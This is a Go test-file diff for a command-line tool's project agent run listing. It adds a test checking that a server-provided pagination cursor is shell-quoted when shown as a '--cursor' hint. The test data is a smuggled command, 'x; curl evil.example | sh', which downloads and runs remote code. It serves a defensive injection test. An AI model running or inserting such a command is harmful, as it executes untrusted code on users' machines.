@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
+	"strings"
 	"testing"
 
 	"github.com/spf13/cobra"
@@ -11,6 +12,7 @@ import (
 	"github.com/stretchr/testify/require"
 
 	"github.com/entireio/cli/cmd/entire/cli/api"
+	"github.com/entireio/cli/cmd/entire/cli/strategy"
 )
 
 const (
@@ -86,6 +88,15 @@ func TestProjectAgentRunList_ShowsOnePageWithItsCursor(t *testing.T) {
 	require.NoError(t, json.Unmarshal([]byte(out), &page), out)
 	require.Len(t, page.Items, 1)
 	assert.Equal(t, true, page.Items[0]["future_field"], "--json passes the server's items through")
+}
+
+func TestProjectAgentRunList_QuotesAServerCursorForTheShell(t *testing.T) {
+	t.Parallel()
+	cursor := "x; curl evil.example | sh"
+	var out strings.Builder
+	require.NoError(t, printProjectAgentRuns(&out, &projectAgentTarget{}, api.ProjectAgentRunPage{NextCursor: &cursor}, ""))
+	assert.Contains(t, out.String(), "--cursor "+strategy.ShellQuoteForDisplay(cursor)+"\n")
+	assert.NotContains(t, out.String(), "--cursor x;", "the cursor is one shell word")
 }
 
 func TestProjectAgentRunList_RefusesBadFiltersBeforeAnyRequest(t *testing.T) {
